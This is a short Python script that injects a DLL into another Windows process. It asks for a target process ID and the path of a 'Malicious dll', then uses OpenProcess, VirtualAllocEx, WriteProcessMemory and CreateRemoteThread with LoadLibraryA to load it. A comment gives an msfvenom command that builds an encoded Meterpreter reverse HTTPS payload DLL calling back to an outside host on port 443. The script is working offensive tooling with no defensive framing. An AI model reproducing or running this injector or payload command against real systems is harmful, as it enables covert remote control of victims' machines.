from ctypes import *

def GetReturnCode(number):
    print("[+] Result: 0x%08x, Return Code: %d"%(number,windll.kernel32.GetLastError()))

PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT_RESERVE = ( 0x1000 | 0x2000 )
PAGE_READWRITE     = 0x04
BYTES_WRITTEN      = c_int(0)
THREAD_ID          = c_ulong(0)

# msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.8 lport=443 -e x86/shikata_ga_nai -f dll --platform win -a x86 > test.dll
#DLLPATH    = 'c:\\users\\IEUser\\desktop\\test.dll'

print("Enter PID to inject into: ")
PID = int(input())
print("PID: %d" %PID )
DLLPATH=input("Enter Location of your Malicious dll: ")

"""
HANDLE WINAPI OpenProcess(
  _In_  DWORD dwDesiredAccess,
  _In_  BOOL bInheritHandle,
  _In_  DWORD dwProcessId
)

HMODULE WINAPI GetModuleHandle(
  _In_opt_  LPCTSTR lpModuleName
);

FARPROC WINAPI GetProcAddress(
  _In_  HMODULE hModule,
  _In_  LPCSTR lpProcName
);

LPVOID WINAPI VirtualAllocEx(
  _In_      HANDLE hProcess,
  _In_opt_  LPVOID lpAddress,
  _In_      SIZE_T dwSize,
  _In_      DWORD flAllocationType,
  _In_      DWORD flProtect
);

BOOL WINAPI WriteProcessMemory(
  _In_   HANDLE hProcess,
  _In_   LPVOID lpBaseAddress,
  _In_   LPCVOID lpBuffer,
  _In_   SIZE_T nSize,
  _Out_  SIZE_T *lpNumberOfBytesWritten
);

HANDLE WINAPI CreateRemoteThread(
  _In_   HANDLE hProcess,
  _In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,
  _In_   SIZE_T dwStackSize,
  _In_   LPTHREAD_START_ROUTINE lpStartAddress,
  _In_   LPVOID lpParameter,
  _In_   DWORD dwCreationFlags,
  _Out_  LPDWORD lpThreadId
);
"""

hndProcess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
GetReturnCode(hndProcess)

hndDll = windll.kernel32.GetModuleHandleA("kernel32.dll")
GetReturnCode(hndDll)

addrLoadLibraryA = windll.kernel32.GetProcAddress(hndDll, "LoadLibraryA")
GetReturnCode(addrLoadLibraryA)

addrBase = windll.kernel32.VirtualAllocEx(hndProcess, None, len(DLLPATH), MEM_COMMIT_RESERVE, PAGE_READWRITE)
GetReturnCode(addrBase)

bSuccess = windll.kernel32.WriteProcessMemory(hndProcess, addrBase, DLLPATH, len(DLLPATH), byref(BYTES_WRITTEN))
GetReturnCode(bSuccess)

if not (windll.kernel32.CreateRemoteThread(hndProcess, None, 0, addrLoadLibraryA, addrBase, 0, byref(THREAD_ID))):
    print("Error creating remote thread!")
    print("Error code: %d"%windll.kernel32.GetLastError())
